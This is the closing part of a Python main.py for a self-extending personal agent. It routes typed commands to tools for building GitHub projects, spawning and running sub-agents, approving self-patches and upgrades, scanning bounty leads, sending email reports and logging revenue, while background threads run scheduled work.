        "telegram_msg.txt": "Hello from your agent!",
        "url_to_pdf.txt": "https://example.com",
    }
    for filename, default_content in defaults.items():
        path = workpath(filename)
        if not os.path.exists(path):
            with open(path, "w") as f:
                f.write(default_content)
            print("Created default " + filename + " — edit it before using that tool.")

# ============================================================
# MAIN LOOP
# ============================================================
# Everything below only runs when main.py is executed directly
# (e.g. `python3 main.py` on Replit). Importing this file as a
# module (e.g. from test_agent.py) will NOT trigger any of this,
# so tests can safely import main without it asking for input.
# ============================================================

def looks_like_github_build_request(text):
    """
    Used only to route otherwise-unmatched free-form input into the REAL
    multi-file build pipeline (build_multifile_project_on_github) instead
    of generic chat. Exists because pasting a big project spec as plain
    text — without knowing the exact 'buildsite:' syntax — used to fall
    through to handle_step_with_retry(), which can describe steps instead
    of executing them. There was no command syntax REQUIRED for a build
    request to actually build; this closes that gap for ANY idea, not
    just one wired to a specific command.
    Intentionally broad: a false positive just means a real (cheap,
    harmless) build gets attempted; a false negative is the actual
    failure mode this exists to close, so it errs toward triggering.
    """
    signals = [
        "github repo", "new repo", "create a repo", "push to github",
        "push it to github", "github pages", "build it on github",
        "build this on github", "on github", "public repo", "make a repo",
        "host it on github", "deploy to github", "put it on github",
        "put this on github", "github.com/", "repo called", "repo named",
    ]
    lowered = text.lower()
    return len(text) > 40 and any(s in lowered for s in signals)

def looks_like_open_ended_build_request(text):
    """
    Catches open-ended 'just build me something' phrasing that doesn't
    name a specific idea and doesn't say the word 'combatt' — routes it
    into combatt_auto_build() (source a real idea + auto-pick the lane)
    instead of generic chat, which would otherwise just talk about doing
    it or ask the user to be more specific.
    """
    lowered = text.lower().strip()
    signals = [
        "build me something", "make me something", "surprise me",
        "build something cool", "make something cool", "build me a project",
        "come up with something and build it", "build whatever you think",
        "pick something and build it", "build me anything", "make me a project",
        "you decide and build it", "build something great", "make something great",
    ]
    return any(s in lowered for s in signals)

def main_loop():
    global conversation_history

    conversation_history = load_history()
    if conversation_history:
        print("Loaded previous conversation history.")

    builtin_history_archiver()

    ensure_default_files()

    sa_ok, sa_report = self_awareness_check()
    if not sa_ok:
        print("[self-check] " + sa_report)

    if DREAMER_ENABLED:
        threading.Thread(target=dreamer_loop, daemon=True).start()
        threading.Thread(target=scheduler_loop, daemon=True).start()
        threading.Thread(target=manager_loop, daemon=True).start()

    threading.Thread(target=bounty_scan_loop, daemon=True).start()

    review_pending_ideas()

    while True:
        # NOTE: _main_thread_busy is intentionally NOT set before input().
        # While the prompt is idle waiting on the user, the dreamer should
        # be free to act (dreamer_can_act() checks this flag). It's only
        # set once we actually have a command to process below.
        user_question = input(
            "Ask me something, type 'goal: ...', 'agenda: ...' (long-term, revisited automatically), 'agendas' to list, 'build: <idea>' (!! force, ?? rival), "
            "'make: <idea> | repo_name', 'buildsite: repo_name | full spec', 'combatt' (or 'combatt: <idea>'), 'github: repo | path | content', "
            "'remember: <note>', 'lessons', 'tools', 'agents', 'runagent: <id>', "
            "'suggest', 'reflect', 'apikeys', 'setkey: name | value', "
            "'monitor', 'stats', 'usage', 'map', 'predict', 'sendemail', 'emailsite: <url>', 'selftest', "
            "'systemcheck', 'systemcheck interval: <hours>', 'telegram', "
            "'archive', 'totext', 'ghusage', 'briefing', 'importtool: <task>', 'checkin', 'drift', 'drift: <agent_id>', "
            "'mergecheck', 'merge: id1, id2', 'whathappened', 'digest', 'digest email', 'gemini: <question>', "
            "'scanbounties', 'bounties', 'approvebounty: <id>', 'rejectbounty: <id>', "
            "'selfaudit', 'selfpatches', 'approvepatch: <id>', 'rejectpatch: <id>', "
            "'knowledge: <question>', 'rebuildgraph', "
            "'depcheck', 'depcheck: <path>', 'autopatch: <repo> | <path>', "
            "'revenue', 'revenuelog', 'logrevenue: source | amount | tool_id | note', "
            "'rollback', 'listbackups', or quit: "
        )
        _main_thread_busy.set()

        try:
            if user_question.lower() == "quit":
                print("Goodbye!")
                break

            elif user_question.lower() == "apikeys":
                store = load_api_keys_store()
                if not store:
                    print("No API keys stored yet.")
                else:
                    for service, key in store.items():
                        print(service + ": " + key[:8] + "..." + key[-4:])

            elif user_question.lower().startswith("setkey:"):
                parts = user_question[7:].split("|")
                if len(parts) != 2:
                    print("Format: setkey: service_name | api_key_value")
                else:
                    service_name, key_value = (p.strip() for p in parts)
                    save_api_key(service_name, key_value)


            elif user_question.lower().startswith("github:"):
                parts = user_question[7:].split("|")
                if len(parts) != 3:
                    print("Format: github: repo_name | file_path | content")
                else:
                    repo_name, file_path, content = (p.strip() for p in parts)
                    print(create_github_repo(repo_name))
                    print(create_github_file(repo_name, file_path, content))

            elif user_question.lower().startswith("remember:"):
                print(remember_note(user_question[9:].strip()))

            elif user_question.lower() == "lessons":
                print(load_lessons() or "No lessons yet.")

            elif user_question.lower().startswith("explain:"):
                decision_id = user_question[8:].strip()
                if not decision_id:
                    print("Format: explain:<decision_id> (e.g. explain:d12)")
                else:
                    print(explain_my_reasoning(decision_id))

            elif user_question.lower() == "contradictions":
                print(contradiction_finder())

            elif user_question.lower() == "tools":
                index = load_tools_index()
                if not index:
                    print("No tools built yet.")
                else:
                    for t in index:
                        trust = str(t.get("good_runs", 0)) + "g/" + str(t.get("bad_runs", 0)) + "b"
                        ts = " [time-sensitive]" if t.get("time_sensitive") else ""
                        print(t["id"] + " (" + t.get("type", "local") + ", " + trust + ")" + ts + ": " + t["idea"])

            elif user_question.lower().startswith("schedule:"):
                parts = user_question[9:].split("|")
                if len(parts) != 2:
                    print("Format: schedule: tool_id | minutes")
                else:
                    tool_id, minutes_text = (p.strip() for p in parts)
                    try:
                        minutes = float(minutes_text)
                        if minutes <= 0:
                            raise ValueError
                        print(add_schedule(tool_id, minutes))
                    except ValueError:
                        print("Minutes must be a positive number.")

            elif user_question.lower().startswith("unschedule:"):
                tool_id = user_question[11:].strip()
                print(remove_schedule(tool_id))

            elif user_question.lower() == "schedules":
                print(list_schedules())

            elif user_question.lower() == "agents":
                agents = load_agents_index()
                if not agents:
                    print("No agents spawned yet. Chains need " + str(CHAIN_SPAWN_THRESHOLD) + " successful runs to spawn an agent.")
                else:
                    print("=== Spawned Agents ===")
                    for a in agents:
                        tools_count = len(a.get("tool_ids", []))
                        ws = a.get("workspace", "")
                        # Count tools the agent has grown since spawning
                        child_index = os.path.join(ws, "tools_index.json")
                        grown = 0
                        if os.path.exists(child_index):
                            try:
                                grown = len(json.loads(read_file(child_index)))
                            except Exception:
                                pass
                        print(a["id"] + " [" + a["name"] + "] runs=" + str(a.get("runs", 0)))
                        print("  Purpose:      " + a["purpose"])
                        print("  Seed tools:   " + str(tools_count) + " | Total tools: " + str(grown))
                        print("  Chain:        " + " -> ".join(a.get("tool_ids", [])))
                        print("  Workspace:    " + ws)
                        print("  Run with:     python3 " + a.get("filepath", ""))
                    print("======================")

            elif user_question.lower().startswith("runagent:"):
                agent_id = user_question[9:].strip()
                agents = load_agents_index()
                match = next((a for a in agents if a["id"] == agent_id or a["name"] == agent_id), None)
                if not match:
                    print("Agent not found: " + agent_id + ". Use 'agents' to list them.")
                elif not os.path.exists(match.get("filepath", "")):
                    print("Agent file missing: " + match.get("filepath", ""))
                else:
                    print("Handing off to agent: " + match["name"] + " — " + match["purpose"])
                    print("(The agent has its own loop — type 'quit' to return here)")
                    print("---")
                    try:
                        # Run interactively — inherit stdin/stdout so the user talks to the child
                        result = subprocess.run(
                            ["python3", match["filepath"]],
                            cwd=match.get("workspace", "."),
                            timeout=None
                        )
                        # Update run count. Re-load fresh under the lock rather
                        # than reusing the `agents` snapshot from before the
                        # subprocess ran (timeout=None — could be a long
                        # session), during which another thread could have
                        # spawned/merged/retired agents; saving the stale
                        # snapshot would silently undo that.
                        with _agents_index_lock:
                            current_agents = load_agents_index()
                            for a in current_agents:
                                if a["id"] == match["id"]:
                                    a["runs"] = a.get("runs", 0) + 1
                            save_agents_index(current_agents)
                        tick_agent_probation(match["id"])
                        print("--- Returned from agent: " + match["name"])
                    except KeyboardInterrupt:
                        print("\n--- Agent interrupted, returning to main.")
                    except Exception as e:
                        print("Error running agent: " + str(e))

            elif user_question.lower() == "depcheck":
                print(scan_dependency_vulnerabilities())

            elif user_question.lower().startswith("depcheck:"):
                print(scan_dependency_vulnerabilities(user_question[9:].strip()))

            elif user_question.lower().startswith("autopatch:"):
                parts = user_question[10:].split("|")
                repo_name = parts[0].strip()
                req_path = parts[1].strip() if len(parts) > 1 else "requirements.txt"
                print(auto_patch_vulnerable_dependencies(repo_name, req_path))

            elif user_question.lower() == "scanbounties":
                print(scan_all_leads())

            elif user_question.lower() == "bounties":
                print(list_bounty_leads())

            elif user_question.lower().startswith("approvebounty:"):
                print(approve_bounty_lead(user_question[14:].strip()))

            elif user_question.lower().startswith("rejectbounty:"):
                print(reject_bounty_lead(user_question[13:].strip()))

            elif user_question.lower() == "selfaudit":
                print(run_self_audit())

            elif user_question.lower() == "selfpatches":
                print(list_self_patches())

            elif user_question.lower().startswith("approvepatch:"):
                print(approve_self_patch(user_question[13:].strip()))

            elif user_question.lower().startswith("rejectpatch:"):
                print(reject_self_patch(user_question[12:].strip()))

            elif user_question.lower().startswith("proposesubsystem:"):
                wall = user_question[17:].strip()
                if not wall:
                    print("Format: proposesubsystem: <description of the structural wall>")
                else:
                    print(propose_architectural_subsystem(wall))

            elif user_question.lower().startswith("knowledge:"):
                print(query_knowledge_graph(user_question[10:].strip()))

            elif user_question.lower() == "rebuildgraph":
                graph = rebuild_knowledge_graph()
                print("Knowledge graph rebuilt: " + str(len(graph["nodes"])) + " node(s), " + str(len(graph["edges"])) + " edge(s).")

            elif user_question.lower() == "suggest":
                print(suggest_new_combo())

            elif user_question.lower() == "reflect":
                pattern = reflect_on_patterns()
                if pattern.strip() == "NONE":
                    print("No repeated pattern found yet.")
                else:
                    print(pattern)
                    if input("Build as permanent command? (yes/no): ").lower() == "yes":
                        cmd_match = re.search(r"COMMAND_NAME:\s*(\w+)", pattern)
                        command_name = cmd_match.group(1) if cmd_match else "newcommand"
                        proposal = propose_new_command(pattern, command_name)
                        print(proposal)
                        if input("Apply to main.py? (yes/no): ").lower() == "yes":
                            func_match = re.search(r"FUNCTION:\s*(.*?)\s*MAIN_LOOP_BRANCH:", proposal, re.DOTALL)
                            function_code = strip_fences(func_match.group(1)) if func_match else ""
                            if function_code:
                                success, msg = apply_self_upgrade(function_code)
                                print(msg)
                            else:
                                print("Could not parse function.")

            elif user_question.lower() == "monitor":
                builtin_website_monitor()

            elif user_question.lower() == "stats":
                builtin_performance_tracker()

            elif user_question.lower() == "usage":
                builtin_usage_graph()

            elif user_question.lower() == "map":
                builtin_dependency_map()

            elif user_question.lower() == "predict":
                builtin_failure_predictor()

            elif user_question.lower() == "sendemail":
                builtin_gmail_sender()

            elif user_question.lower() == "telegram":
                builtin_telegram_notifier()

            elif user_question.lower() == "archive":
                builtin_history_archiver()

            elif user_question.lower() == "totext":
                builtin_webpage_to_text()

            elif user_question.lower() == "ghusage":
                builtin_github_actions_monitor()

            elif user_question.lower() == "revenue":
                print(revenue_summary())

            elif user_question.lower().startswith("logrevenue:"):
                parts = user_question[11:].split("|")
                if len(parts) < 2:
                    print("Format: logrevenue: source | amount | tool_id (optional) | note (optional)")
                else:
                    source = parts[0].strip()
                    amount = parts[1].strip()
                    tool_id = parts[2].strip() if len(parts) > 2 and parts[2].strip() else None
                    note = parts[3].strip() if len(parts) > 3 else ""
                    result = log_revenue(source, amount, tool_id=tool_id, note=note)
                    if "error" in result:
                        print("Could not log revenue: " + result["error"])
                    else:
                        print("Logged $" + format(result["amount"], ".2f") + " from " + result["source"] +
                              " as " + result["id"] + ". Run 'revenue' for the full summary.")

            elif user_question.lower().startswith("revenuelog"):
                print(list_revenue())

            elif user_question.lower() == "briefing":
                builtin_daily_briefing()

            elif user_question.lower().startswith("importtool:"):
                task_idea = user_question[11:].strip()
                if not task_idea:
                    print("Format: importtool: <what you need>")
                else:
                    result = import_github_tool_workflow(task_idea)
                    print(result)

            elif user_question.lower() == "checkin":
                run_checkin()

            elif user_question.lower() == "drift":
                run_drift_check()

            elif user_question.lower().startswith("drift:"):
                target = user_question[6:].strip()
                run_drift_check(target if target else None)

            elif user_question.lower() == "listbackups":
                backups = list_backups()
                if not backups:
                    print("No backups yet — one is created automatically before the next self-upgrade.")
                else:
                    print("=== Backups of " + SELF_FILE + " ===")
                    for b in backups:
                        print("  " + b)
                    print("Most recent: " + backups[-1] + " (used by 'rollback')")

            elif user_question.lower() == "rollback":
                ok, msg = restore_latest_backup()
                print(msg)
                if ok:
                    print("Restart the program to actually run the restored version.")

            elif user_question.lower() == "mergecheck":
                merged = auto_merge_check(silent=False)
                if not merged:
                    print("No overlapping agents found worth merging right now.")

            elif user_question.lower().startswith("merge:"):
                parts = [p.strip() for p in user_question[6:].split(",") if p.strip()]
                if len(parts) < 2:
                    print("Format: merge: agent_id_1, agent_id_2 [, agent_id_3 ...]")
                else:
                    merge_agents(parts)

            elif user_question.lower() in ("whathappened", "log", "activity"):
                whathappened()

            elif user_question.lower().startswith("make:"):
                parts = user_question[5:].split("|")
                if len(parts) != 2:
                    print("Format: make: idea | repo_name")
                else:
                    idea, repo_name = parts[0].strip(), parts[1].strip()
                    result = build_and_fix_on_github(idea, repo_name)
                    print(result)
                    update_memory("Built: " + idea + " -> " + result[:300])

            elif user_question.lower().startswith("buildsite:"):
                parts = user_question[10:].split("|", 1)
                if len(parts) != 2 or not parts[0].strip() or not parts[1].strip():
                    print("Format: buildsite: repo_name | full spec describing every file/feature needed")
                else:
                    repo_name, spec = parts[0].strip(), parts[1].strip()
                    result = build_multifile_project_on_github(spec, repo_name)
                    print(result)
                    update_memory("Built multi-file site: " + repo_name + " -> " + result[:300])

            elif (user_question.lower() == "combatt" or user_question.lower().startswith("combatt:")
                  or looks_like_open_ended_build_request(user_question)):
                idea_override = user_question[8:].strip() if user_question.lower().startswith("combatt:") else None
                result = combatt_auto_build(idea_override)
                print(result)
                update_memory("Combatt auto-build -> " + result[:300])

            elif user_question.lower().startswith("gemini:"):
                gemini_prompt = user_question[7:].strip()
                if not gemini_prompt:
                    print("Format: gemini: <question>")
                else:
                    gemini_reply = ask_gemini(gemini_prompt)
                    print(gemini_reply)
                    save_to_history(user_question, gemini_reply)
                    conversation_history += "\nUser asked: " + user_question + "\nAssistant answered: " + gemini_reply + "\n"

            elif user_question.lower() == "firebasesetup":
                if FIREBASE_CONFIG:
                    print("FIREBASE_CONFIG is already set — accounts/private-data/file-upload sites will use it automatically.")
                else:
                    print(
                        "One-time setup for real accounts/login/file-uploads on your generated sites (free forever, no card needed):\n"
                        "1. Go to https://console.firebase.google.com -> Add project (any name, Analytics optional).\n"
                        "2. In the project, click the </> (web app) icon to register a web app -> copy the firebaseConfig object it shows you.\n"
                        "3. Build -> Authentication -> Get started -> enable the 'Email/Password' sign-in method.\n"
                        "4. Build -> Firestore Database -> Create database -> Start in production mode -> pick any region.\n"
                        "5. In Firestore -> Rules tab, replace the contents with exactly this, then Publish:\n\n"
                        + FIRESTORE_SETUP_RULES_TEXT + "\n\n"
                        "6. Build -> Storage -> Get started -> production mode -> same region as Firestore. In Storage -> Rules tab, replace the contents with exactly this, then Publish:\n\n"
                        + STORAGE_SETUP_RULES_TEXT + "\n\n"
                        "7. In Replit, open Secrets and add a secret named FIREBASE_CONFIG. For the value, paste the config object "
                        "from step 2 as JSON — e.g. {\"apiKey\":\"...\",\"authDomain\":\"...\",\"projectId\":\"...\",\"storageBucket\":\"...\",\"messagingSenderId\":\"...\",\"appId\":\"...\"}\n"
                        "8. Restart the agent. Any future site idea that needs logins/private data/uploads will wire this in automatically."
                    )

            elif user_question.lower().startswith("addstripelink:"):
                remainder = user_question[14:].strip()
                parts = remainder.split("|", 1)
                if len(parts) != 2 or not parts[0].strip() or not parts[1].strip():
                    print("Format: addstripelink: product-key | https://buy.stripe.com/...")
                else:
                    product_key, url = parts[0].strip(), parts[1].strip()
                    save_stripe_link(product_key, url)
                    print("Registered Stripe link for '" + product_key + "'. Future/existing STRIPE_LINK: " + product_key + " placeholders will resolve to it on next build/edit/push.")

            elif user_question.lower() == "checkallsites":
                builtin_web_tools_uptime_check()

            elif user_question.lower() == "resetstyle":
                if os.path.exists(DESIGN_SYSTEM_FILE):
                    os.remove(DESIGN_SYSTEM_FILE)
                    print("Cleared saved house style — the next successful site build will establish a new one.")
                else:
                    print("No house style saved yet — nothing to clear.")

            elif user_question.lower().startswith("editsite:"):
                remainder = user_question[9:].strip()
                parts = remainder.split("|", 1)
                if len(parts) != 2 or not parts[0].strip() or not parts[1].strip():
                    print("Format: editsite: tool_id or description | the change you want")
                else:
                    ref, change_request = parts[0].strip(), parts[1].strip()
                    result = edit_web_tool_workflow(ref, change_request)
                    print(result)
                    update_memory("Edited web tool: " + ref + " -> " + result[:300])

            elif user_question.lower().startswith("checksite:"):
                target_url = user_question[10:].strip()
                if not target_url:
                    print("Format: checksite: <url>")
                else:
                    result = check_website_bugs(target_url)
                    print(result)
                    save_to_history(user_question, result)
                    conversation_history += "\nUser asked: " + user_question + "\nAssistant answered: " + result + "\n"

            elif user_question.lower().startswith("emailsite:"):
                # Format: "emailsite: <url>" (sends to AGENT_EMAIL itself)
                #      or "emailsite: <url> to: <someone@example.com>"
                remainder = user_question[10:].strip()
                target_url, _, to_part = remainder.partition(" to:")
                target_url = target_url.strip()
                to_override = to_part.strip() or None
                if not target_url:
                    print("Format: emailsite: <url>  (optionally: emailsite: <url> to: someone@example.com)")
                else:
                    print("Checking " + target_url + " — this can take a little while for the full browser check...")
                    raw_result = check_website_bugs(target_url)
                    subject, body = format_bug_report_for_email(target_url, raw_result)
                    recipient = to_override or os.environ.get("AGENT_EMAIL")
                    if not recipient:
                        print("No recipient available — AGENT_EMAIL isn't set in secrets, and no 'to:' address was given.")
                    else:
                        ok, err = send_email(recipient, subject, body)
                        if ok:
                            print("Full report emailed to " + recipient + " — Subject: " + subject)
                        else:
                            print("Could not email the report: " + str(err))
                            print("Here's the report anyway:\n" + body)
                    save_to_history(user_question, body)
                    conversation_history += "\nUser asked: " + user_question + "\nAssistant answered: (emailed report for " + target_url + ")\n"

            elif user_question.lower().startswith("selftest"):
                # "selftest"        -> runs and prints to console
                # "selftest email"  -> runs, prints to console, AND emails the report
                want_email = "email" in user_question.lower()
                results = self_test_all()
                if want_email:
                    subject, body = format_self_test_report_for_email(results)
                    recipient = os.environ.get("AGENT_EMAIL")
                    if not recipient:
                        print("Can't email the report — AGENT_EMAIL isn't set in secrets. (Report was still printed above.)")
                    else:
                        ok, err = send_email(recipient, subject, body)
                        if ok:
                            print("Report also emailed to " + recipient + " — Subject: " + subject)
                        else:
                            print("Could not email the report: " + str(err))
                save_to_history(user_question, "(self-test run: " + str(len(results)) + " items checked)")
                conversation_history += "\nUser asked: " + user_question + "\nAssistant answered: (ran self-test, " + str(len(results)) + " items checked)\n"

            elif user_question.lower().startswith("digest"):
                # "digest"        -> plain-English activity summary, printed to console
                # "digest email"  -> same, printed AND emailed to AGENT_EMAIL
                want_email = "email" in user_question.lower()
                report = build_activity_report()
                print("\n" + report + "\n")
                if want_email:
                    recipient = os.environ.get("AGENT_EMAIL")
                    if not recipient:
                        print("Can't email the digest — AGENT_EMAIL isn't set in secrets. (Digest was still printed above.)")
                    else:
                        subject = "Agent activity digest — " + time.strftime("%B %d, %Y")
                        ok, err = send_email(recipient, subject, report)
                        if ok:
                            print("Digest also emailed to " + recipient + " — Subject: " + subject)
                        else:
                            print("Could not email the digest: " + str(err))
                save_to_history(user_question, "(ran activity digest)")
                conversation_history += "\nUser asked: " + user_question + "\nAssistant answered: (ran plain-English activity digest)\n"

            elif user_question.lower().startswith("systemcheck interval:"):
                global MANAGER_INTERVAL_SECONDS
                raw = user_question.split(":", 1)[1].strip()
                try:
                    hours = float(raw)
                    if hours <= 0:
                        print("Interval must be a positive number of hours.")
                    else:
                        MANAGER_INTERVAL_SECONDS = int(hours * 60 * 60)
                        print("Automatic full system checks now run every " + raw + " hour(s). "
                              "Takes effect within " + str(MANAGER_TICK_SECONDS) +
                              "s — won't interrupt a check already in progress.")
                except ValueError:
                    print("Format: systemcheck interval: <hours>  (e.g. 'systemcheck interval: 4')")

            elif user_question.lower().startswith("systemcheck"):
                # On-demand Manager pass — always emails (per explicit request
                # that everything Fixer/Police/Observer find should reach email),
                # uses the fuller AI-generated test questions since this is a
                # deliberate manual request, not the resource-conscious
                # automatic background version.
                run_manager_pass(use_ai_test_questions=True, auto_email=True)
                save_to_history(user_question, "(ran full system check)")
                conversation_history += "\nUser asked: " + user_question + "\nAssistant answered: (ran full system check — Observer/Police/Fixer)\n"

            elif user_question.lower().startswith("build:"):
                idea = user_question[6:].strip()
                result = build_and_fix_workflow(idea)
                print(result)
                save_to_history(user_question, result)
                conversation_history += "\nUser asked: " + user_question + "\nAssistant answered: " + result + "\n"

            elif user_question.lower().startswith("edit:"):
                parts = user_question[5:].split("|")
                if len(parts) != 3:
                    print("Format: edit: filename | old text | new text")
                else:
                    filename, old_text, new_text = (p.strip() for p in parts)
                    print(edit_file(filename, old_text, new_text))

            elif user_question.lower().startswith("agenda:"):
                agenda_text = user_question[7:].strip()
                if not agenda_text:
                    print("Format: agenda: <long-term goal text>")
                else:
                    gid = add_agenda_goal(agenda_text)
                    print("Added to agenda as " + gid + ". The dreamer will revisit it periodically without asking again.")

            elif user_question.lower().strip() == "agendas":
                print(list_agenda_goals())

            elif user_question.lower().startswith("goal:"):
                goal = user_question[5:].strip()
                print("Planning steps for: " + goal)
                steps = make_plan(goal)
                if not steps:
                    print("Could not create a plan.")
                    previous_results = ""
                else:
                    previous_results = run_goal_with_dependencies(steps, conversation_history)
                print("Goal complete!")
                save_to_history(goal, previous_results)
                conversation_history += previous_results

            elif user_question.lower().startswith("showdown:"):
                parts = user_question[9:].split("|")
                if len(parts) != 2:
                    print("Format: showdown: tool_id_a | tool_id_b")
                else:
                    a, b = parts[0].strip(), parts[1].strip()
                    print(tool_showdown(a, b))

            elif user_question.lower() == "prune":
                print(auto_prune_duplicates())

            elif user_question.lower() == "predict_next":
                print(predict_next_need())

            elif user_question.lower() == "speculate":
                print(list_speculative())

            elif user_question.lower().startswith("acceptspec:"):
                print(accept_speculative(user_question[11:].strip()))

            elif user_question.lower().startswith("rejectspec:"):
                print(reject_speculative(user_question[11:].strip()))

            elif user_question.lower().startswith("borrow:"):
                parts = user_question[7:].split("|")
                if len(parts) != 2:
                    print("Format: borrow: requesting_pool_id (or 'main') | what you need")
                else:
                    pool, need = parts[0].strip(), parts[1].strip()
                    print(borrow_tool(pool, need))

            elif user_question.lower().startswith("data:"):
                parts = user_question[5:].split("|")
                if len(parts) == 1:
                    print(parse_structured_data(parts[0].strip()))
                elif len(parts) == 2:
                    print(parse_structured_data(parts[0].strip(), parts[1].strip()))
                elif len(parts) == 3:
                    print(parse_structured_data(parts[0].strip(), parts[1].strip(), parts[2].strip()))
                else:
                    print("Format: data: filepath_or_text | operation(summary/filter/extract/to_json/to_csv) | query")

            elif user_question.lower().startswith("previewpatch:"):
                diff_text = user_question[13:].strip()
                if not diff_text:
                    print("Format: previewpatch: <unified diff text>")
                else:
                    print(preview_patch(diff_text))

            elif user_question.lower().startswith("notify:"):
                ok, msg = notify_telegram(user_question[7:].strip())
                print(msg)

            elif user_question.lower().startswith("safeupgrade:"):
                parts = user_question[12:].split("|")
                if len(parts) != 2:
                    print("Format: safeupgrade: function_code | context_description")
                else:
                    code, ctx = parts[0].strip(), parts[1].strip()
                    ok, msg = apply_self_upgrade_safe(code, ctx)
                    print(msg)

            elif "how many tool" in user_question.lower():
                index = load_tools_index()
                count = len(index)
                if count == 0:
                    print("Dreamer hasn't built any tools yet.")
                else:
                    good = sum(t.get("good_runs", 0) for t in index)
                    bad = sum(t.get("bad_runs", 0) for t in index)
                    print("Dreamer has built " + str(count) + " tool" + ("" if count == 1 else "s") +
                          " so far (" + str(good) + " successful runs, " + str(bad) + " failed runs across all of them).")

            elif looks_like_github_build_request(user_question):
                # Auto-routed: this looked like "build/push a project to
                # GitHub" even though it didn't use 'buildsite:' syntax.
                # Route it into the real execution pipeline instead of
                # letting it fall through to chat, where it could just be
                # described instead of actually built.
                repo_name_prompt = (
                    "Extract or invent a short, valid GitHub repo name (lowercase, "
                    "letters/numbers/hyphens only, no spaces) for this project request. "
                    "Respond with ONLY the repo name, nothing else:\n\n" + user_question
                )
                suggested_repo = ask_ai(repo_name_prompt).strip().splitlines()[0].strip()
                suggested_repo = re.sub(r"[^a-zA-Z0-9._-]", "-", suggested_repo)[:80] or "new-project"
                print("Detected a GitHub build request — building for real as repo '"
                      + suggested_repo + "' (not just describing it)...")
                result = build_multifile_project_on_github(user_question, suggested_repo, skip_clarify=True)
                print(result)
                update_memory("Built multi-file site (auto-routed): " + suggested_repo + " -> " + result[:300])
                save_to_history(user_question, result)
                conversation_history += "\nUser asked: " + user_question + "\nAssistant answered: " + result + "\n"

            else:
                answer, final_step, _ = handle_step_with_retry(user_question, "", conversation_history)
                print(answer)
                save_to_history(user_question, answer)
                conversation_history += "\nUser asked: " + user_question + "\nAssistant answered: " + answer + "\n"
        except Exception as e:
            # One bad command (malformed JSON, network blip, unexpected
            # None, etc.) used to crash the whole process here and take
            # both daemon threads (dreamer_loop, scheduler_loop) down with
            # it. Catch, report, and keep the agent running.
            print("[main loop] error handling command: " + str(e))

        _main_thread_busy.clear()
        review_pending_ideas()
        print("---")


if __name__ == "__main__":
    main_loop()
